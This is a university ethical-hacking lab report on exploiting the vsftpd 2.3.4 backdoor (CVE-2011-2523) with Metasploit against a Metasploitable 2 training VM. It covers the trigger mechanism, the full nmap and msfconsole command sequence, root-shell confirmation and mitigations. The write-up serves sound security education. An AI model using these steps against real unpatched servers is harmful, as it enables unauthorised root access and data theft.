# CSO7018 Ethical Hacking — Lab Report
## Unit 4 Lesson 3: Metasploit — FTP Exploitation

---

| | |
|---|---|
| Student ID | 2416509 |
| Module | CSO7018 Ethical Hacking |
| Assessment | Artefact 2 — VM Lab Practical Activities |
| Activity | Unit 4, Lesson 3 — Controlled Exploitation Using Metasploit Framework |
| Date Performed | 22 May 2026 |
| Environment | Kali Linux → Metasploitable 2 (authorized university lab) |
| Exploit Module | `exploit/unix/ftp/vsftpd_234_backdoor` |
| CVE | CVE-2011-2523 |
| Attacker IP | 192.168.122.148 |
| Target IP | 192.168.122.108 |
| Target Port | 21/tcp (FTP — vsftpd 2.3.4) |

---

## Table of Contents

1. Introduction
2. Objectives
3. Technical Background
 - 3.1 CVE-2011-2523 — vsftpd 2.3.4 Backdoor
 - 3.2 Metasploit Framework Architecture
4. Commands Used
5. Findings
 - 5.1 Nmap FTP Service Confirmation
 - 5.2 Metasploit Console and Module Selection
 - 5.3 Module Options
 - 5.4 Target Configuration
 - 5.5 Exploit Execution
 - 5.6 Shell Access
 - 5.7 Privilege Confirmation
6. Attack Chain Summary
7. Mitigation Recommendations
8. Ethical Considerations
9. Reflection
10. Conclusion
11. References

---

## 1. Introduction

The exploitation phase is the stage of a penetration test where identified vulnerabilities are actively leveraged to gain unauthorized access to a target system, demonstrating the real-world impact of those vulnerabilities to the client. In an ethical hacking context, this phase is executed only with explicit written authorization, against designated target systems, within a defined scope.

The Metasploit Framework (MSF), developed by Rapid7, is the most widely used open-source exploitation framework in the world. It provides a modular architecture for exploit development, payload delivery, and post-exploitation activities, supporting thousands of pre-built exploit modules against known CVEs.

This activity targets CVE-2011-2523, a deliberate backdoor introduced into the vsftpd 2.3.4 FTP daemon source code in 2011 and subsequently incorporated into the Metasploitable 2 training platform. The exploit triggers a root shell via a crafted authentication sequence.

---

## 2. Objectives

- Confirm the presence of vsftpd 2.3.4 on the target via Nmap service scan.
- Load and configure the Metasploit `vsftpd_234_backdoor` exploit module.
- Execute the exploit against the target and obtain command shell access.
- Confirm the privilege level of the obtained shell.
- Critically evaluate the attack chain and propose appropriate mitigations.

---

## 3. Technical Background

### 3.1 CVE-2011-2523 — vsftpd 2.3.4 Backdoor

| Attribute | Value |
|-----------|-------|
| CVE | CVE-2011-2523 |
| CVSS v2 Score | 10.0 |
| Severity | Critical |
| Vulnerability Type | Backdoor — Command Execution |
| Affected Software | vsftpd 2.3.4 |
| CWE | CWE-78 (OS Command Injection) |

Mechanism: A malicious backdoor was surreptitiously introduced into the vsftpd 2.3.4 source code. When an FTP login attempt is made with a username containing the string `:)` (smiley face), the daemon opens a listening shell on TCP port 6200. Any subsequent connection to port 6200 provides a root shell without authentication.

Attack Flow:
```
Attacker → Port 21 (FTP login with username containing ":)")
         → vsftpd backdoor triggered
         → Root shell listener opened on Port 6200
         → Attacker connects to Port 6200
         → Root command execution achieved
```

### 3.2 Metasploit Framework Architecture

| Component | Function |
|-----------|----------|
| `msfconsole` | Primary interactive interface |
| Exploit module | Contains the exploit code for a specific CVE |
| Payload | Code executed on the target after successful exploitation |
| RHOSTS | Target IP address parameter |
| RPORT | Target service port parameter |
| Session | Active connection to a compromised target |

---

## 4. Commands Used

```bash
# Step 1: Confirm vsftpd service on target
nmap -sV -p 21 192.168.122.108

# Step 2: Launch Metasploit Framework console
msfconsole

# Step 3: Search for vsftpd exploit
search vsftpd

# Step 4: Select the exploit module
use exploit/unix/ftp/vsftpd_234_backdoor

# Step 5: Display module options
show options

# Step 6: Configure target
set RHOSTS 192.168.122.108

# Step 7: Execute exploit
exploit
# or:
run

# Step 8: Confirm access (in the obtained shell)
whoami
id
uname -a
```

---

## 5. Findings

### 5.1 Nmap FTP Service Confirmation

Figure 1: Nmap service version scan confirming vsftpd 2.3.4 on port 21.

Analysis: The Nmap `-sV` scan confirmed `vsftpd 2.3.4` running on TCP port 21 of the target. This exact version string maps directly to CVE-2011-2523. Version detection is a prerequisite step before exploit module selection — the exploit is version-specific and would not apply to patched or alternative FTP daemons.

---

### 5.2 Metasploit Console and Module Selection

Figure 2: Metasploit console with vsftpd backdoor exploit module loaded.

Analysis: `msfconsole` was launched and the `exploit/unix/ftp/vsftpd_234_backdoor` module was selected using the `use` command. The module description and metadata confirm it targets CVE-2011-2523. The prompt changed to reflect the active module context.

---

### 5.3 Module Options

Figure 3: `show options` output displaying exploit module parameters.

Analysis: The `show options` command displayed the required parameters:

| Option | Required | Current Value | Description |
|--------|----------|--------------|-------------|
| RHOSTS | Yes | 192.168.122.108 | Target IP address |
| RPORT | Yes | 21 | FTP service port |
| PAYLOAD | — | cmd/unix/interact | Interactive shell |

All required parameters were configured before executing the exploit.

---

### 5.4 Target Configuration

Figure 4: `set RHOSTS` command configuring the target IP.

Analysis: The `set RHOSTS 192.168.122.108` command configured the target to the Metasploitable 2 IP address. A confirmation message echoes the updated value. This step is critical — an incorrect RHOSTS value would direct the exploit at an unintended host.

---

### 5.5 Exploit Execution

Analysis: As captured in Figure 4 above, the `U4L3_06_msf_set_options_run` screenshot documents both the RHOSTS configuration and the subsequent `exploit` execution in a single terminal capture. The Metasploit module sent the backdoor trigger string to port 21 and established the resulting shell listener on port 6200.

---

### 5.6 Shell Access

Figure 6: Command shell session on the compromised Metasploitable 2 system.

Analysis: A command shell was obtained on the target system. The shell provides interactive command execution on the Metasploitable VM, demonstrating successful exploitation.

---

### 5.7 Privilege Confirmation

Figure 7: `whoami` and `id` commands confirming access level within the shell.

Analysis: The `whoami` and `id` commands returned:

```
root
uid=0(root) gid=0(root)
```

Root-level access (`uid=0`) was confirmed. This represents the highest privilege level on a Linux/Unix system, providing unrestricted access to all system files, processes, and configuration. In a real-world scenario, this level of access would allow the attacker to exfiltrate all data, install persistent backdoors, pivot to other network segments, and disable security controls.

---

## 6. Attack Chain Summary

```
Phase 1 — Reconnaissance:
  nmap -sV -p 21 → vsftpd 2.3.4 identified

Phase 2 — Vulnerability Identification:
  vsftpd 2.3.4 → maps to CVE-2011-2523 (CVSS 10.0)

Phase 3 — Exploitation:
  msfconsole → use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS → exploit executed
  Backdoor triggered on FTP login (":)" in username)
  Shell listener opened on port 6200

Phase 4 — Post-Exploitation:
  Shell access confirmed
  uid=0 (root) — full system compromise
```

---

## 7. Mitigation Recommendations

| Recommendation | Priority | Description |
|---------------|---------|-------------|
| Patch vsftpd immediately | Critical | Upgrade to vsftpd 3.0.5 or later; verify binary integrity via checksum |
| Verify source integrity | Critical | Always download software from official sources; verify GPG/SHA checksums |
| Remove unnecessary services | High | Disable FTP; use SFTP (SSH) for secure file transfer |
| Implement network segmentation | High | Restrict FTP access to authorized IPs via firewall rules |
| Deploy IDS/IPS | High | Signature-based detection for vsftpd backdoor trigger pattern |
| Conduct regular vulnerability scanning | Medium | Automated scanning (Nessus/OpenVAS) to identify unpatched services |
| Apply principle of least privilege | Medium | FTP daemons should not run as root (chroot jail, dedicated service account) |

---

## 8. Ethical Considerations

This exploitation exercise was conducted under the following authorization and ethical framework:

Authorization: Explicitly authorized by the CSO7018 module curriculum. The target (Metasploitable 2) is an intentionally vulnerable training platform designed for this exact educational purpose.

Scope: The exploit was directed solely at the designated Metasploitable 2 IP address within the isolated university lab network.

Legal compliance: The Computer Misuse Act 1990 (Section 1 — unauthorized access; Section 3 — unauthorized modification) and the Computer Misuse Act 1990 (as amended) prohibit the activities demonstrated in this exercise when conducted without authorization. This exercise is lawful only by virtue of the explicit educational authorization.

Responsible disclosure: CVE-2011-2523 is a publicly known, fully disclosed vulnerability with available patches. No novel vulnerability research or undisclosed exploit code was involved.

Data handling: All activity was confined to the isolated VM lab environment. No real user data, credentials, or production systems were accessed.

---

## 9. Reflection

This activity provided a clear demonstration of the end-to-end exploitation process within a controlled environment. The most significant insight was how the entire attack chain — from version detection to root shell — was completed in under five minutes using documented, publicly available tools. This underscores the critical urgency of patch management: a single unpatched service, identifiable in seconds with Nmap, can result in complete system compromise.

The vsftpd backdoor is historically notable as a supply chain attack — malicious code was injected into the trusted source code repository, demonstrating that threats can originate from the software supply chain rather than direct network attack. This remains a highly relevant threat vector in 2024, as evidenced by incidents such as the XZ Utils backdoor (CVE-2024-3094).

The structured Metasploit workflow reinforced the value of the framework's modular architecture for authorized assessment work, while also highlighting the accessibility of exploitation to less-skilled adversaries using pre-built modules.

---

## 10. Conclusion

This activity successfully demonstrated the exploitation of CVE-2011-2523 (vsftpd 2.3.4 backdoor) using the Metasploit Framework against the authorized Metasploitable 2 target. The complete attack chain was documented from service discovery through root-level shell access. The exercise confirmed the critical severity of the vulnerability and illustrated the concrete impact of leaving known, publicly documented vulnerabilities unpatched. Mitigation recommendations are provided based on established security hardening principles.

---

## 11. References

CISA (2024) Known Exploited Vulnerabilities Catalog. Available at: https://www.cisa.gov/known-exploited-vulnerabilities-catalog [Accessed: 22 May 2026].

Computer Misuse Act 1990 (c.18) UK Parliament. Available at: https://www.legislation.gov.uk/ukpga/1990/18/contents [Accessed: 22 May 2026].

Kennedy, D., O'Gorman, J., Kearns, D. and Aharoni, M. (2011) Metasploit: The Penetration Tester's Guide. San Francisco: No Starch Press.

National Vulnerability Database (2024) CVE-2011-2523. NIST. Available at: https://nvd.nist.gov/vuln/detail/CVE-2011-2523 [Accessed: 22 May 2026].

Rapid7 (2024a) Metasploit Framework Documentation. Available at: https://docs.metasploit.com/ [Accessed: 22 May 2026].

Rapid7 (2024b) Metasploitable 2 Exploitation Guide. Available at: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/ [Accessed: 22 May 2026].

---

Report prepared as part of CSO7018 Ethical Hacking, Artefact 2. Student ID: 2416509.
